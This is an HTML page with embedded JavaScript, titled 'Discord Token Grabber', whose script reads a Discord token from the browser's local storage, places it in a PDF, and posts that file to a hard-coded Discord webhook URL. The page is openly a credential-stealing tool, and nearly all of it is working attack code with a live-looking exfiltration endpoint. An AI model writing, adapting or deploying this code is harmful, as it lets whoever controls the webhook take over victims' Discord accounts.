<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Token Grabber</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script>
        async function grabToken() {
            // Get the Discord token from local storage
            const token = localStorage.getItem('token');

            // If token exists, create a PDF and send it to the webhook
            if (token) {
                const { jsPDF } = window.jspdf;

                // Create a new PDF document
                const pdf = new jsPDF();
                pdf.text(`Discord Token: ${token}`, 10, 10);

                // Generate the PDF as a Blob
                const pdfBlob = pdf.output('blob');

                // Create a FormData object to send the file
                const formData = new FormData();
                formData.append('file', pdfBlob, 'token.pdf');

                try {
                    // Send the PDF to the webhook
                    const response = await fetch('https://discord.com/api/webhooks/1405973604235083899/jvNOpzcVs9GJ4nY84-YJdNY7lTfofwLzrGnK_iG2cbKUBq4I5YeiMOMG6LuzBhszyKum', {
                        method: 'POST',
                        body: formData
                    });

                    const data = await response.json();
                    console.log('Success:', data);
                } catch (error) {
                    console.error('Error:', error);
                }
            } else {
                console.log('No Discord token found.');
            }
        }
    </script>
</head>
<body>
    <h1>Click the button to send your Discord token in a PDF</h1>
    <button onclick="grabToken()">Send Token as PDF</button>
</body>
</html>
